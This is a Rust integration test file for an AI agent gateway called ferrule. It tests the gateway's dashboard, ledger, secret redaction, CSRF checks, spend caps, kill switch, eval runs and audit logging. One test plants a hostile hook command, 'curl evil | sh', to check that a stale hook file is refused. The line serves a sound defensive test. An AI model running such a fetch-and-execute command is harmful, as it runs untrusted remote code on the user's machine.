    let config = std::fs::read_to_string(home.join("ferrule.toml")).unwrap();
    assert!(config.contains("deepseek/deepseek-v4.1-flash"), "{config}");
    assert!(config.contains("price_source"), "{config}");
    let health = page.read("health");
    assert!(
        !problems(&health)
            .iter()
            .any(|p| p.contains("default model")),
        "{health:#}"
    );
    tg.say(42, "again");
    tg.wait_for(42, "OR:deepseek/deepseek-v4.1-flash", n);

    // A model left without prices: the page and `ferrule doctor` say so.
    assert!(
        page.read("models")["unpriced"]
            .to_string()
            .contains("broken/model"),
        "unpriced"
    );
    let out = ferrule(home, &["doctor"]);
    let doctor = plain(&out.stdout);
    assert!(
        doctor.contains("broken/model") && doctor.contains("fill-prices"),
        "{}",
        describe(&out)
    );

    // Offline: the catalog answers from its cache and says so.
    or.offline.store(true, Ordering::SeqCst);
    let list = &page.read("catalog?refresh=1")["list"];
    assert!(
        list["rows"]
            .to_string()
            .contains("deepseek/deepseek-v4.1-flash"),
        "{list:#}"
    );
    assert!(
        list["sources"]
            .as_array()
            .unwrap()
            .iter()
            .any(|s| s["from"] == "cache" && !s["error"].is_null()),
        "{list:#}"
    );
}

#[test]
fn the_usage_on_the_page_matches_ferrule_ledger() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let dir = home(&two(&a, &b, "", &telegram(&tg)));
    let home = dir.path();
    let now = chrono::Utc::now();
    let row = |ago_h: i64,
               session: &str,
               shape: &str,
               model: &str,
               outcome: &str,
               cost: Option<f64>,
               lat: u64| {
        let mut v = json!({
            "timestamp": (now - chrono::Duration::hours(ago_h)).to_rfc3339(),
            "session_id": session, "task_shape": shape,
            "provider": "a", "model": model, "iteration": 0,
            "input_tokens": 1200, "cached_input_tokens": 300, "output_tokens": 80,
            "tool_calls": 0, "latency_ms": lat, "outcome": outcome,
        });
        if let Some(c) = cost {
            v["cost_usd"] = json!(c);
        }
        if shape == "scheduler" {
            v["origin"] = json!("t-digest");
        }
        v.to_string()
    };
    let lines = [
        row(1, "telegram__42", "chat", "a-one", "ok", Some(0.0123), 400),
        row(
            2,
            "telegram__42",
            "chat",
            "a-one",
            "retried",
            Some(0.002),
            900,
        ),
        row(30, "telegram__-100", "chat", "a-one", "ok", None, 300),
        row(
            50,
            "scheduler__t-digest",
            "scheduler",
            "a-two",
            "error",
            Some(0.5),
            1500,
        ),
        row(
            24 * 20,
            "telegram__42",
            "chat",
            "a-two",
            "ok",
            Some(9.0),
            100,
        ),
        "{not json".to_string(),
    ];
    std::fs::write(home.join("data/ledger.jsonl"), lines.join("\n") + "\n").unwrap();
    let _gw = gateway(home, &[]);
    let (_, page) = sign_in(&tg, 0);

    let usage = page.read("usage?days=7");
    let out = ferrule(home, &["ledger", "--since", "7d"]);
    assert!(out.status.success(), "{}", describe(&out));
    let table = plain(&out.stdout);
    let lines: Vec<Vec<&str>> = table
        .lines()
        .skip_while(|l| !l.starts_with("shape"))
        .skip(1)
        .map(|l| l.split_whitespace().collect())
        .filter(|c: &Vec<&str>| c.len() == 12)
        .collect();
    let rows = usage["per_model"].as_array().unwrap();
    assert_eq!(rows.len(), lines.len(), "{usage:#}\n{table}");
    for r in rows {
        let line = lines
            .iter()
            .find(|c| c[0] == r["shape"] && c[2] == r["model"])
            .unwrap_or_else(|| panic!("{r} not in\n{table}"));
        for (i, key) in [
            (3, "calls"),
            (4, "errors"),
            (5, "input_tokens"),
            (6, "cached_input_tokens"),
            (7, "output_tokens"),
            (9, "p50_ms"),
            (10, "p95_ms"),
        ] {
            assert_eq!(line[i], r[key].to_string(), "{key}: {r} vs {line:?}");
        }
        let cost = line[11].trim_end_matches('*');
        match r["usd"].as_f64() {
            Some(c) => assert_eq!(cost, format!("{c:.4}"), "{r} vs {line:?}"),
            None => assert_eq!(cost, "-"),
        }
    }
    let calls: u64 = lines.iter().map(|c| c[3].parse::<u64>().unwrap()).sum();
    assert_eq!(usage["total"]["calls"], calls);
    assert_eq!(calls, 4, "the 20-day-old row is outside 7 days");
    assert_eq!(usage["per_task"][0]["key"], "task t-digest");
    assert_eq!(usage["malformed"], 1);
    assert_eq!(page.read("usage?days=30")["total"]["calls"], 5);
}

#[test]
fn no_page_or_json_response_carries_a_seeded_secret() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let extra = format!(
        r#"{}
[health]
watchdog_after_secs = 1
heartbeat_url = "http://127.0.0.1:9/ping/HB-PATH-SECRET"

[[mcp.servers]]
name = "remote"
url = "http://127.0.0.1:9/mcp/MCP-PATH-SECRET"
headers = {{ Authorization = "Bearer MCP-HEADER-SECRET" }}
"#,
        telegram(&tg)
    );
    let dir = home(&two(&a, &b, "", &extra));
    let home = dir.path();
    // Workspace hooks whose text carries the key: shown, but redacted.
    std::fs::create_dir_all(home.join("work/.ferrule")).unwrap();
    std::fs::write(
        home.join("work/.ferrule/hooks.toml"),
        format!("[[PreToolUse]]\ncommand = \"notify --key {SECRET}\"\n"),
    )
    .unwrap();
    let _gw = gateway(home, &[("FERRULE_TEST_KEY", SECRET)]);
    let (_, page) = sign_in(&tg, 0);

    // A running turn whose message carries the key.
    tg.say(42, &format!("HANG with {SECRET}"));
    page.until("health", |h| {
        h["turns"]
            .as_array()
            .is_some_and(|t| t.iter().any(|t| t["stuck"] == true))
    });
    let mut seen = String::new();
    let mut each: Vec<(String, String)> = Vec::new();
    for path in ["/", "/app.js", "/app.css"] {
        let (s, body) = page.get_raw(path);
        assert_eq!(s, 200, "{path}");
        each.push((path.into(), body));
    }
    for path in [
        "session",
        "health",
        "connections",
        "models",
        "catalog",
        "recommend",
        "usage",
        "usage?days=30",
        "tasks",
        "logs",
        "logs?kind=warn",
        "extensions",
        "settings",
        "agents",
        "eval",
    ] {
        let (s, v) = page.get(path);
        assert!(s == 200 || s == 503, "{path}: {s} {v}");
        each.push((path.into(), v.to_string()));
    }
    // M24's reads that are POSTs: the eval's estimate and its question.
    // …and every M24 edit: its question, its answer or its refusal.
    for (path, body) in [
        ("eval/estimate", json!({ "model": "a" })),
        ("eval/start", json!({ "model": "b/b-large" })),
        (
            "settings/caps",
            json!({ "caps": { "max_usd_per_day": 50.0 } }),
        ),
        (
            "settings/caps",
            json!({ "caps": { "max_usd_per_day": 1.0 } }),
        ),
        ("mcp/disable", json!({ "name": "remote" })),
        ("mcp/disable", json!({ "name": "remote", "confirm": true })),
        ("mcp/enable", json!({ "name": "remote" })),
        ("mcp/remove", json!({ "name": "remote" })),
        ("skills/disable", json!({ "name": "some-skill" })),
        ("skills/enable", json!({ "name": "some-skill" })),
        ("hooks/trust", json!({ "sha": "0" })),
        ("hooks/untrust", json!({})),
        (
            "tasks/schedule",
            json!({ "id": "nope", "schedule": "0 9 * * *" }),
        ),
        ("tasks/model", json!({ "id": "nope", "model": "a" })),
    ] {
        let (s, v) = page.post(path, body);
        assert!(s == 200 || s == 409 || s == 400, "{path}: {s} {v}");
        each.push((path.into(), v.to_string()));
    }
    for (_, body) in &each {
        seen.push_str(body);
    }
    assert!(seen.contains("HANG with"), "the turn was on the page");
    assert!(seen.contains("notify --key"), "the workspace hooks were");
    assert!(seen.contains("127.0.0.1:9"), "the heartbeat's host was");
    for secret in [
        SECRET,
        "TESTTOKEN",
        "HB-PATH-SECRET",
        "MCP-PATH-SECRET",
        "MCP-HEADER-SECRET",
    ] {
        for (path, body) in &each {
            assert!(!body.contains(secret), "{secret} leaked in {path}: {body}");
        }
    }
}

#[test]
fn an_eval_run_never_starts_or_touches_the_dashboard() {
    let python = Command::new("python3")
        .arg("--version")
        .output()
        .is_ok_and(|o| o.status.success());
    if !python {
        eprintln!("python3 not found: skipping (the starter suite's mock needs it)");
        return;
    }
    let suite = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../evals/starter");
    let mut mock = Command::new("python3")
        .arg(suite.join("mock/model.py"))
        .args(["--port", "0"])
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    let mut line = String::new();
    BufReader::new(mock.stdout.take().unwrap())
        .read_line(&mut line)
        .unwrap();
    let url = line.trim().rsplit(' ').next().unwrap().to_string();
    let mock = Running(mock);
    let dir = home(&format!(
        r#"default_provider = "mock"

[providers.mock]
base_url = "{url}"
api_key_env = "FERRULE_TEST_KEY"
model = "mock"
price_input_per_mtok = 1.0
price_cached_input_per_mtok = 0.1
price_output_per_mtok = 2.0

[skills]
enabled = false

[sandbox]
mode = "off"

[dashboard]
enabled = true

[eval]
suite = {suite:?}
"#
    ));
    let home = dir.path();
    let out = ferrule(
        home,
        &["eval", "run", suite.to_str().unwrap(), "--tag", "smoke"],
    );
    assert!(
        plain(&out.stdout).contains("smoke") || out.status.success(),
        "{}",
        describe(&out)
    );

    // M24: `ferrule model eval` asks first; with --yes it runs the smoke
    // subset, stores it, and puts it beside the default's run above.
    let out = ferrule(home, &["model", "eval", "mock"]);
    assert!(!out.status.success(), "{}", describe(&out));
    assert!(describe(&out).contains("--yes"), "{}", describe(&out));
    let out = ferrule(home, &["model", "eval", "mock", "--yes"]);
    let (said, told) = (plain(&out.stdout), describe(&out));
    assert!(out.status.success(), "{told}");
    assert!(told.contains("Estimate: about"), "{told}");
    assert!(said.contains("mock/mock: 4/4 pass"), "{told}");
    assert!(said.contains("the default, mock/mock: 4/4 pass"), "{told}");
    // A tiny cap stops it: exit 3, the stop said.
    let config = std::fs::read_to_string(home.join("ferrule.toml")).unwrap();
    std::fs::write(
        home.join("ferrule.toml"),
        format!("{config}\n[trust]\nmax_tokens_per_run = 1500\n"),
    )
    .unwrap();
    let out = ferrule(home, &["model", "eval", "mock", "--yes"]);
    drop(mock);
    assert_eq!(out.status.code(), Some(3), "{}", describe(&out));
    assert!(plain(&out.stdout).contains("stopped"), "{}", describe(&out));
    assert!(!home.join("data/gateway/dashboard.json").exists());
    assert!(!home.join("data/private/dashboard").exists());
}

// ---- M24: evaluating a candidate -----------------------------------------

fn starter() -> std::path::PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../evals/starter")
}

/// `[eval]` at the checkout's starter suite, and `b` priced.
fn eval_extra(tg: &FakeTelegram, trust: &str) -> String {
    format!(
        "{}\n[eval]\nsuite = {:?}\n\n[trust]\n{trust}\n",
        telegram(tg),
        starter().display().to_string()
    )
}

#[test]
fn the_page_estimates_an_eval_asks_first_runs_it_and_stores_it_beside_the_default() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let config = two(&a, &b, "", &eval_extra(&tg, "max_usd_per_day = 10.0")).replace(
        "model = \"b-large\"\n",
        "model = \"b-large\"\nprice_input_per_mtok = 2.0\nprice_cached_input_per_mtok = 0.5\nprice_output_per_mtok = 8.0\n",
    );
    let dir = home(&config);
    let home = dir.path();
    let _gw = gateway(home, &[]);
    let (_, page) = sign_in(&tg, 0);
    assert_eq!(page.read("eval")["job"], Value::Null);

    // The estimate: the smoke subset's typical use at b's prices.
    let (s, v) = page.post(
        "eval/estimate",
        json!({ "model": "b/b-large", "suite": "smoke" }),
    );
    assert_eq!(s, 200, "{v}");
    let e = &v["estimate"];
    assert_eq!(e["tasks"].as_array().unwrap().len(), 4, "{e:#}");
    let usd = e["usd"].as_f64().expect("priced");
    let (tin, tout) = (
        e["typical"]["input"].as_f64().unwrap(),
        e["typical"]["output"].as_f64().unwrap(),
    );
    assert!((usd - (tin * 2.0 + tout * 8.0) / 1e6).abs() < 1e-9, "{e:#}");
    assert!(e["text"].as_str().unwrap().contains("Estimate:"), "{e:#}");
    assert_eq!(e["default"], "a/a-one");
    assert_eq!(e["refused"], Value::Null);
    assert!(
        (e["budget"]["max_usd"].as_f64().unwrap() - 5.0).abs() < 1e-9,
        "the per-run cap is the lesser: {e:#}"
    );

    // Starting asks first, with the estimate as the question; nothing ran.
    let (s, v) = page.post("eval/start", json!({ "model": "b/b-large" }));
    assert_eq!(s, 409, "{v}");
    assert!(v["confirm"].as_str().unwrap().contains("Estimate:"), "{v}");
    assert!(b.calls().is_empty(), "nothing is sent before the confirm");
    // Without the CSRF header it's refused outright.
    let o = origin(page.port);
    let (s, _, _) = http(
        page.port,
        "POST",
        "/api/eval/start",
        &[
            ("cookie", &page.cookie),
            ("origin", &o),
            ("content-type", "application/json"),
        ],
        &json!({ "model": "b/b-large", "confirm": true }).to_string(),
    );
    assert_eq!(s, 403);

    // The default's run first, so the candidate has something beside it.
    let (s, v) = page.post("eval/start", json!({ "model": "a", "confirm": true }));
    assert_eq!(s, 200, "{v}");
    let done = |j: &Value| j["job"]["running"] == false;
    let first = page.until("eval", done);
    assert_eq!(first["job"]["done"], 4, "{first:#}");
    assert_eq!(first["job"]["model"], "a/a-one");
    assert!(a.calls().iter().any(|m| m == "a-one"));

    let (s, v) = page.post(
        "eval/start",
        json!({ "model": "b/b-large", "suite": "smoke", "confirm": true }),
    );
    assert_eq!(s, 200, "{v}");
    // Progress shows while it runs, then the result beside the default's.
    let j = page.until("eval", |j| {
        j["job"]["model"] == "b/b-large" && j["job"]["running"] == false
    });
    let job = &j["job"];
    assert_eq!(job["done"], 4, "{job:#}");
    assert!(job["lines"].as_array().unwrap().len() >= 8, "{job:#}");
    let f = &job["finished"];
    assert_eq!(f["summary"]["planned"], 4, "{job:#}");
    assert_eq!(f["summary"]["ran"], 4, "{job:#}");
    assert_eq!(f["summary"]["reference"], "b/b-large");
    assert!(f["summary"]["usd"].as_f64().unwrap() > 0.0, "{job:#}");
    assert_eq!(f["baseline"]["reference"], "a/a-one", "{job:#}");
    assert_eq!(
        f["baseline"]["run_id"],
        first["job"]["finished"]["summary"]["run_id"]
    );
    assert!(b.calls().iter().all(|m| m == "b-large"));

    // Stored as `ferrule eval` stores a run, and listed by it.
    let run_id = f["summary"]["run_id"].as_str().unwrap();
    let saved = home.join("data/eval").join(run_id);
    assert!(saved.join("run.json").is_file() && saved.join("report.txt").is_file());
    let rep = ferrule(home, &["eval", "report", "--run", run_id]);
    assert!(rep.status.success(), "{}", describe(&rep));
    assert!(plain(&rep.stdout).contains("b-large"), "{}", describe(&rep));
    // Counted as the owner's spend, under the eval's own tree, and audited.
    let ledger = std::fs::read_to_string(home.join("data/ledger.jsonl")).unwrap();
    assert!(ledger.contains(&format!("eval:{run_id}")), "{ledger}");
    let audit = std::fs::read_to_string(home.join("data/trust/audit.jsonl")).unwrap();
    assert!(
        audit.contains("\"model.eval\"") && audit.contains("\"dashboard\""),
        "{audit}"
    );
    // Nothing of the eval's leaks a key into the page.
    assert!(!j.to_string().contains("sk-test"));
}

#[test]
fn an_eval_obeys_the_owners_caps_and_kill_switch() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    // The day's $1 cap, $1.50 already spent today.
    let dir = home(&two(&a, &b, "", &eval_extra(&tg, "max_usd_per_day = 1.0")));
    let home = dir.path();
    let row = json!({"timestamp": chrono::Utc::now().to_rfc3339(), "session_id": "telegram__42",
        "task_shape": "chat", "provider": "a", "model": "a-one", "iteration": 0,
        "input_tokens": 10, "cached_input_tokens": 0, "output_tokens": 1, "tool_calls": 0, "latency_ms": 1,
        "outcome": "ok", "cost_usd": 1.5});
    std::fs::write(home.join("data/ledger.jsonl"), format!("{row}\n")).unwrap();
    let _gw = gateway(home, &[]);
    let (_, page) = sign_in(&tg, 0);
    let (s, v) = page.post("eval/estimate", json!({ "model": "a" }));
    assert_eq!(s, 200, "{v}");
    assert!(
        v["estimate"]["refused"]
            .as_str()
            .unwrap()
            .contains("used up"),
        "{v}"
    );
    let (s, v) = page.post("eval/start", json!({ "model": "a", "confirm": true }));
    assert_eq!(s, 400, "{v}");
    assert!(v["error"].as_str().unwrap().contains("used up"), "{v}");
    assert!(a.calls().is_empty(), "nothing was sent: {:?}", a.calls());

    // The CLI refuses the same way, and so does the kill switch.
    let out = ferrule(home, &["model", "eval", "a", "--yes"]);
    assert!(!out.status.success(), "{}", describe(&out));
    assert!(describe(&out).contains("used up"), "{}", describe(&out));
    std::fs::remove_file(home.join("data/ledger.jsonl")).unwrap();
    let (s, v) = page.post("kill/on", json!({ "confirm": true }));
    assert_eq!(s, 200, "{v}");
    let (s, v) = page.post("eval/start", json!({ "model": "a", "confirm": true }));
    assert_eq!(s, 400, "{v}");
    assert!(v["error"].as_str().unwrap().contains("kill switch"), "{v}");
    assert!(a.calls().is_empty());
}

// ---- M24: editing from the page ------------------------------------------

/// The audit events on the page's log, newest first.
fn audited(page: &Page, event: &str) -> Vec<Value> {
    page.read("logs?kind=audit")["rows"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|r| r["level"] == event)
        .cloned()
        .collect()
}

#[test]
fn every_edit_on_the_page_needs_csrf_asks_where_it_should_and_is_audited() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let extra = format!(
        "{}\n[trust]\nmax_usd_per_day = 5.0\n\n[[mcp.servers]]\nname = \"files\"\ncommand = \"mcp-files\"\n",
        telegram(&tg)
    );
    let config =
        two(&a, &b, "", &extra).replace("[skills]\nenabled = false", "[skills]\nenabled = true");
    let dir = home(&config);
    let home = dir.path();
    let skill = home.join("work/.ferrule/skills/pdf");
    std::fs::create_dir_all(&skill).unwrap();
    std::fs::write(
        skill.join("SKILL.md"),
        "---\nname: pdf\ndescription: Reads PDFs.\n---\nBody.\n",
    )
    .unwrap();
    let out = ferrule(
        home,
        &[
            "tasks",
            "add",
            "digest",
            "--kind",
            "cron",
            "--schedule",
            "0 9 * * *",
            "--channel",
            "telegram",
            "--chat-id",
            "42",
            "--prompt",
            "p",
        ],
    );
    assert!(out.status.success(), "{}", describe(&out));
    let hooks = "[[PreToolUse]]\ncommand = \"echo one\"\n";
    std::fs::create_dir_all(home.join("work/.ferrule")).unwrap();
    std::fs::write(home.join("work/.ferrule/hooks.toml"), hooks).unwrap();
    let _gw = gateway(home, &[]);
    let (_, page) = sign_in(&tg, 0);
    let task = page.read("tasks")["tasks"][0]["id"]
        .as_str()
        .unwrap()
        .to_string();

    // Without the CSRF header, every edit is refused outright.
    let o = origin(page.port);
    for path in [
        "settings/caps",
        "mcp/disable",
        "mcp/enable",
        "mcp/remove",
        "skills/disable",
        "skills/enable",
        "hooks/trust",
        "hooks/untrust",
        "tasks/schedule",
        "tasks/model",
    ] {
        let (s, _, _) = http(
            page.port,
            "POST",
            &format!("/api/{path}"),
            &[
                ("cookie", &page.cookie),
                ("origin", &o),
                ("content-type", "application/json"),
            ],
            &json!({ "confirm": true, "name": "files" }).to_string(),
        );
        assert_eq!(s, 403, "{path}");
    }
    let config = || std::fs::read_to_string(home.join("ferrule.toml")).unwrap();
    assert!(config().contains("max_usd_per_day = 5.0"));

    // Caps: raising asks, and nothing changes before the yes; then the
    // running gateway's limit moves, the file keeps the rest.
    let raise = json!({ "caps": { "max_usd_per_day": 50.0 } });
    let (s, v) = page.post("settings/caps", raise.clone());
    assert_eq!(s, 409, "{v}");
    assert!(config().contains("max_usd_per_day = 5.0"));
    let (s, v) = page.post(
        "settings/caps",
        json!({ "caps": { "max_usd_per_day": 50.0 }, "confirm": true }),
    );
    assert_eq!(s, 200, "{v}");
    assert!(v["said"].as_str().unwrap().contains("50"), "{v}");
    let limit = |page: &Page| page.read("usage")["caps"]["caps"][0]["limit"].as_f64();
    assert_eq!(limit(&page), Some(50.0), "the live hub");
    assert!(config().contains("max_usd_per_day = 50"), "{}", config());
    assert!(config().contains("[providers.a]"));
    let (s, v) = page.post(
        "settings/caps",
        json!({ "caps": { "max_usd_per_day": 3.0 } }),
    );
    assert_eq!(s, 200, "lowering doesn't ask: {v}");
    assert_eq!(limit(&page), Some(3.0));
    let caps = audited(&page, "settings.caps");
    assert_eq!(caps.len(), 2, "{caps:?}");
    assert!(
        caps[0]["text"]
            .as_str()
            .unwrap()
            .contains("\"by\":\"dashboard\""),
        "{caps:?}"
    );
    let (s, _) = page.post(
        "settings/caps",
        json!({ "caps": { "max_usd_per_day": -1 } }),
    );
    assert_eq!(s, 400);

    // MCP: disabling asks; enabling doesn't; removing asks.
    let (s, _) = page.post("mcp/disable", json!({ "name": "files" }));
    assert_eq!(s, 409);
    let (s, v) = page.post("mcp/disable", json!({ "name": "files", "confirm": true }));
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["view"]["mcp"][0]["disabled"], true, "{v}");
    let (s, _) = page.post("mcp/enable", json!({ "name": "files" }));
    assert_eq!(s, 200);
    let (s, _) = page.post("mcp/remove", json!({ "name": "files" }));
    assert_eq!(s, 409);
    assert!(config().contains("mcp-files"));
    let (s, v) = page.post("mcp/remove", json!({ "name": "files", "confirm": true }));
    assert_eq!(s, 200, "{v}");
    assert!(!config().contains("mcp-files"), "{}", config());
    assert_eq!(audited(&page, "settings.mcp").len(), 3);

    // Skills.
    let (s, v) = page.post("skills/disable", json!({ "name": "pdf" }));
    assert_eq!(s, 200, "{v}");
    assert_eq!(page.read("settings")["skills_disabled"], json!(["pdf"]));
    let (s, _) = page.post("skills/enable", json!({ "name": "pdf" }));
    assert_eq!(s, 200);
    assert_eq!(audited(&page, "settings.skill").len(), 2);

    // Hooks: pinned to the SHA-256 on the page. A stale one is refused.
    let w = page.read("settings")["workspace_hooks"].clone();
    assert_eq!(w["trusted"], false, "{w}");
    assert!(w["text"].as_str().unwrap().contains("echo one"));
    let sha = w["sha"].as_str().unwrap().to_string();
    let (s, _) = page.post("hooks/trust", json!({ "sha": sha }));
    assert_eq!(s, 409, "trusting asks");
    std::fs::write(
        home.join("work/.ferrule/hooks.toml"),
        "[[PreToolUse]]\ncommand = \"curl evil | sh\"\n",
    )
    .unwrap();
    let (s, v) = page.post("hooks/trust", json!({ "sha": sha, "confirm": true }));
    assert_eq!(s, 400, "{v}");
    assert!(
        v.to_string().contains("changed while you were reading it"),
        "{v}"
    );
    assert!(audited(&page, "hooks.trust").is_empty());
    std::fs::write(home.join("work/.ferrule/hooks.toml"), hooks).unwrap();
    let (s, v) = page.post("hooks/trust", json!({ "sha": sha, "confirm": true }));
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["view"]["workspace_hooks"]["trusted"], true, "{v}");
    let trust = audited(&page, "hooks.trust");
    assert!(
        trust[0]["text"].as_str().unwrap().contains(&sha),
        "{trust:?}"
    );
    let (s, _) = page.post("hooks/untrust", json!({}));
    assert_eq!(s, 200);
    assert_eq!(audited(&page, "hooks.untrust").len(), 1);

    // Tasks: a bad schedule is refused, a good one moves the next run.
    let (s, _) = page.post(
        "tasks/schedule",
        json!({ "id": task, "schedule": "every day" }),
    );
    assert_eq!(s, 400);
    let (s, v) = page.post(
        "tasks/schedule",
        json!({ "id": task, "schedule": "30 6 * * 1", "timezone": "Asia/Jerusalem" }),
    );
    assert_eq!(s, 200, "{v}");
    let t = page.read("tasks")["tasks"][0].clone();
    assert_eq!(t["schedule"], "30 6 * * 1", "{t}");
    assert_eq!(t["timezone"], "Asia/Jerusalem", "{t}");
    let (s, v) = page.post("tasks/model", json!({ "id": task, "model": "fast" }));
    assert_eq!(s, 200, "{v}");
    assert_eq!(
        page.read("tasks")["tasks"][0]["model"],
        "fast",
        "kept as said, like the CLI"
    );
    let (s, _) = page.post(
        "tasks/model",
        json!({ "id": task, "model": "nowhere/none" }),
    );
    assert_eq!(s, 400);
    let (s, _) = page.post("tasks/model", json!({ "id": task, "model": "default" }));
    assert_eq!(s, 200);
    assert_eq!(page.read("tasks")["tasks"][0]["model"], Value::Null);
    assert_eq!(audited(&page, "task.schedule").len(), 1);
    assert_eq!(audited(&page, "model.task").len(), 2);
}

#[test]
fn the_cli_runs_the_same_edits_and_raising_a_cap_needs_yes_without_a_terminal() {
    let (a, b) = (Server::start("A"), Server::start("B"));
    let tg = FakeTelegram::start();
    let extra = format!(
        "{}\n[trust]\nmax_usd_per_day = 5.0\n\n[[mcp.servers]]\nname = \"files\"\ncommand = \"mcp-files\"\n",
        telegram(&tg)
    );
    let dir = home(&two(&a, &b, "", &extra));
    let home = dir.path();
    let config = || std::fs::read_to_string(home.join("ferrule.toml")).unwrap();
    let ok = |args: &[&str]| {
        let out = ferrule(home, args);
        assert!(out.status.success(), "{args:?}: {}", describe(&out));
        plain(&out.stdout)
    };

    assert!(ok(&["trust", "caps"]).contains("max_usd_per_day"));
    let out = ferrule(home, &["trust", "caps", "--set", "usd_per_day=50"]);
    assert!(
        !out.status.success(),
        "raising needs --yes: {}",
        describe(&out)
    );
    assert!(config().contains("max_usd_per_day = 5.0"));
    ok(&["trust", "caps", "--set", "usd_per_day=50", "--yes"]);
    assert!(config().contains("max_usd_per_day = 50"), "{}", config());
    ok(&["trust", "caps", "--set", "max_usd_per_day=2"]);

    ok(&["mcp", "disable", "files"]);
    assert!(config().contains("disabled = [\"files\"]"), "{}", config());
    assert!(ok(&["mcp", "list"]).contains("disabled"));
    ok(&["mcp", "enable", "files"]);

    ok(&[
        "tasks",
        "add",
        "digest",
        "--kind",
        "cron",
        "--schedule",
        "0 9 * * *",
        "--channel",
        "telegram",
        "--chat-id",
        "42",
        "--prompt",
        "p",
    ]);
    let list = ok(&["tasks", "list"]);
    let id = list.split_whitespace().next().unwrap().to_string();
    assert!(ok(&[
        "tasks",
        "schedule",
        &id,
        "30 6 * * 1",
        "--tz",
        "Asia/Jerusalem"
    ])
    .contains("Asia/Jerusalem"));
    assert!(ok(&["tasks", "list"]).contains("30 6 * * 1"));
    let out = ferrule(home, &["tasks", "schedule", &id, "every day"]);
    assert!(!out.status.success(), "{}", describe(&out));
    ok(&["tasks", "model", &id, "fast"]);

    let audit = ok(&["trust", "audit"]);
    for event in [
        "settings.caps",
        "settings.mcp",
        "task.schedule",
        "model.task",
    ] {
        assert!(audit.contains(event), "{event}: {audit}");
    }
}
